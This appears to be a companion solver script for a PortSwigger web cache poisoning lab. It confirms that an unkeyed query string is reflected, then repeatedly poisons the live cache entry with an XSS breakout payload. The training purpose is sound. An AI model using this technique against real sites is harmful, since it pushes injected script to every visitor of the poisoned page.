#!/usr/bin/env python3
"""
Web cache poisoning via an unkeyed query string
PortSwigger Web Security Academy -- Web Cache Poisoning

Companion script for the writeup: 05-unkeyed-query-string.md

What this does:
    Confirms the entire query string is reflected into a <link rel="canonical">
    tag using Origin as a safe cache buster (a header that IS keyed here, so
    it's safe to vary during recon), then poisons the production cache entry
    directly with a query-string XSS breakout. Because GET / and GET /?x=y
    share the same cache key, poisoning any variant poisons the plain URL
    every visitor actually requests.

Usage:
    python 05-unkeyed-query-string.py <lab-url>
    e.g. python 05-unkeyed-query-string.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import asyncio
import secrets
import sys
import httpx


def _cache_buster() -> str:
    return secrets.token_hex(4)


def _is_cache_miss(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "miss" in xc or "miss" in cf


def _is_cache_hit(headers: dict) -> bool:
    xc = headers.get("x-cache", "").lower()
    cf = headers.get("cf-cache-status", "").lower()
    return "hit" in xc or "hit" in cf


async def _lab_solved(client: httpx.AsyncClient, url: str) -> bool:
    r = await client.get(url)
    return "congratulations" in r.text.lower() or "is-solved" in r.text.lower()


async def solve(lab_url: str) -> None:
    xss = "'/><script>alert(1)</script>"

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as client:
        # Step 1: confirm the query string is reflected, using Origin
        # (which IS part of the cache key here) as a safe recon buster.
        cb_origin = f"https://{_cache_buster()}.example.com"
        r = await client.get(f"{lab_url}/?test=REFLECTED_CHECK", headers={"Origin": cb_origin})
        if "REFLECTED_CHECK" not in r.text:
            print("[-] Query string not reflected -- cannot proceed")
            return
        for line in r.text.split("\n"):
            if "REFLECTED_CHECK" in line:
                print(f"[+] Query string reflected: {line.strip()[:150]}")
                break

        # Step 2: poison the live cache entry directly -- no cache buster
        # this time, since the whole point is landing on the real entry
        # GET / resolves to.
        print("[*] Starting poison + re-poison loop...")
        for cycle in range(40):
            r = await client.get(f"{lab_url}/?evil={xss}")
            has_xss = "alert(1)" in r.text
            if _is_cache_miss(dict(r.headers)) and has_xss:
                print(f"    Cycle {cycle + 1}: POISONED (miss, XSS present)")
            elif _is_cache_hit(dict(r.headers)) and has_xss:
                print(f"    Cycle {cycle + 1}: still poisoned (hit)")

            if await _lab_solved(client, lab_url):
                print("[+] Lab solved.")
                return
            await asyncio.sleep(3)

    print("[-] Not solved after re-poison loop")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    asyncio.run(solve(sys.argv[1].rstrip("/")))
